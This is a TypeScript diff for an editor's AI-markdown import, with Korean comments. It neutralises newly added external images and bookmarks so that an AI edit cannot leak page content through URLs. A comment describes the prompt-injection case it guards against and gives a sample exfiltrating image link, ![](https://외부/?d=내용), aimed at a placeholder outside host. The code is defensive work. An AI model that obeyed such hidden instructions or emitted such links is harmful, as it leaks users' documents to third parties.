@@ -84,7 +84,36 @@ export function cleanAIMarkdown(raw: string): string {
  * AI 가 돌려준 마크다운 → 블록. 자리표시는 원래 블록으로, Noty 규칙 줄은 전용 블록으로 바꾼다.
  * 모델이 지운 자리표시 블록은 끝에 다시 붙여 잃어버리지 않게 한다.
  */
-export function aiMarkdownToBlocks(raw: string, parse: ParseMarkdown, originals: Map<string, Block> = new Map()): Block[] {
+/** 마크다운 속 이미지 주소들 (편집 전 원문에 있던 이미지는 다시 넣어도 된다). 캡션 있는 이미지는 <img src="…"> 로 나온다. */
+export function markdownImageUrls(markdown: string): Set<string> {
+  const urls = [
+    ...[...markdown.matchAll(/!\[[^\]]*\]\(\s*<?([^)\s>]+)/g)].map((m) => m[1]),
+    ...[...markdown.matchAll(/<img\b[^>]*?\bsrc=["']([^"']+)["']/gi)].map((m) => m[1].replace(/&amp;/g, "&")),
+  ];
+  return new Set(urls);
+}
+
+/**
+ * AI가 새로 쓴 외부 이미지는 넣지 않고 글자로 바꾼다. 페이지에 넣는 순간 주소를 불러오므로,
+ * 문서에 숨긴 지시(프롬프트 인젝션)로 ![](https://외부/?d=내용) 을 쓰게 하면 내용이 밖으로 샐 수 있다.
+ */
+function neutralizeImages(blocks: Block[], allowed: ReadonlySet<string>): Block[] {
+  return blocks.map((block) => {
+    const url = typeof block.props?.url === "string" ? block.props.url : "";
+    if (block.type === "image" && url && !allowed.has(url)) {
+      const label = block.props?.caption || block.props?.name || "이미지";
+      return { type: "paragraph", content: [{ type: "text", text: `🖼 ${label} (${url})`, styles: {} }] };
+    }
+    return block.children?.length ? { ...block, children: neutralizeImages(block.children, allowed) } : block;
+  });
+}
+
+export function aiMarkdownToBlocks(
+  raw: string,
+  parse: ParseMarkdown,
+  originals: Map<string, Block> = new Map(),
+  allowedImageUrls: ReadonlySet<string> = new Set(),
+): Block[] {
   const lines = cleanAIMarkdown(raw).split("\n");
   const used = new Set<string>();
   const out: Block[] = [];
@@ -92,7 +121,7 @@ export function aiMarkdownToBlocks(raw: string, parse: ParseMarkdown, originals:
   const flush = () => {
     const markdown = buffer.join("\n").trim();
     buffer = [];
-    if (markdown) out.push(...parse(markdown));
+    if (markdown) out.push(...neutralizeImages(parse(markdown), allowedImageUrls));
   };
   const push = (block: Block) => {
     flush();
@@ -145,7 +174,14 @@ export function aiMarkdownToBlocks(raw: string, parse: ParseMarkdown, originals:
       const key = `url:${trimmed}`;
       const original = originals.get(key);
       if (original) used.add(key);
-      push(original ?? { type: toEmbed(trimmed) ? "embed" : "bookmark", props: { url: trimmed } });
+      // 새 북마크는 서버가 그 주소에 접속해 미리보기를 가져오므로(주소에 내용을 실어 보낼 수 있음) 링크 글자로만 넣는다.
+      // 원래 있던 북마크와 허용된 사이트 임베드(유튜브 등)는 그대로.
+      push(
+        original ??
+          (toEmbed(trimmed)
+            ? { type: "embed", props: { url: trimmed } }
+            : { type: "paragraph", content: [{ type: "link", href: trimmed, content: [{ type: "text", text: trimmed, styles: {} }] }] }),
+      );
       continue;
     }
 
@@ -235,7 +271,7 @@ export function createAIEditorBridge(editor: any, pageId: string): AIEditorBridg
       if (targets.some((b) => !b)) return "missing";
       // 요청한 뒤에 누군가(나 포함) 그 부분을 고쳤으면 덮어쓰지 않는다
       if (blocksToAIMarkdown(targets, toMarkdown).markdown !== selection.markdown) return "changed";
-      const blocks = aiMarkdownToBlocks(markdown, parse, selection.originals);
+      const blocks = aiMarkdownToBlocks(markdown, parse, selection.originals, markdownImageUrls(selection.markdown));
       editor.transact(() => editor.replaceBlocks(targets, blocks.length ? blocks : [{ type: "paragraph" }]));
       return "ok";
     },
